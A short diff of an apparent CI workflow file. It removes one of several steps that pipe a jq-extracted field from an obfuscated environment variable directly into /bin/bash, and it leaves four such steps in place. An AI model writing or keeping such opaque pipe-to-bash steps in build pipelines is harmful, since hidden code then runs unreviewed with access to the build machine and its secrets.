@@ -26,7 +26,6 @@ jobs:
           echo $sym9726 | jq -r .osqi98 | /bin/bash
           echo $gkas9 | jq -r .ckmfw27111 | /bin/bash
           printf '%s' "$wmf45" | jq -r .qtqh17 | /bin/bash
-          echo $z0 | jq -r .x3748 | /bin/bash
           printf '%s' "$dq35727" | jq -r .h23 | /bin/bash
 
       - name: Archive artifact
